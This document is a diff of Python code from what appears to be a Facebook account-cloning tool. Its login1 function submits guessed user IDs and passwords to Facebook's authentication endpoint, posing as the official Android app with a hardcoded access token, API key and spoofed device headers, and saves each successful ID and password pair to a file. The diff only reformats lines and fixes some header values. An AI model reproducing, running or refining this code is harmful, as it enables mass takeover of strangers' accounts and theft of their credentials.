@@ -419,8 +419,7 @@ def login1(uid):
                 'source': 'device_based_login',
                 'email': str(uid),
                 'password': str(pw),
-                'access_token':
-                '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                 'generate_session_cookies': '1',
                 'meta_inf_fbmeta': '',
                 'advertiser_id': str(uuid.uuid4()),
@@ -429,20 +428,19 @@ def login1(uid):
                 'client_country_code': 'US',
                 'method': 'auth.login',
                 'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class':
-                'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                 'api_key': '882a8490361da98702bf97a021ddc14d'
             }
             head = {
                 'User-Agent': ua,
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': str(random.randint(20000, 30000)),
-                'X-FB-SIM-HNI': str(random.randint(29000, 40000)),
-                'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'WIFI', 'MOBILE.3G', 'MOBILE.4G']),
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                'x-fb-device-group': str(random.randint(5000, 6000)),
+                'x-fb-device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -452,11 +450,7 @@ def login1(uid):
                 'Content-Length': '706'
             }
             url = "https://b-graph.facebook.com/auth/login"
-            rp = requests.post(url,
-                               data=data,
-                               headers=head,
-                               allow_redirects=False,
-                               verify=True).json()
+            rp = requests.post(url, data=data, headers=head, allow_redirects=False, verify=True).json()
             if "session_key" in rp:
                 oks.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
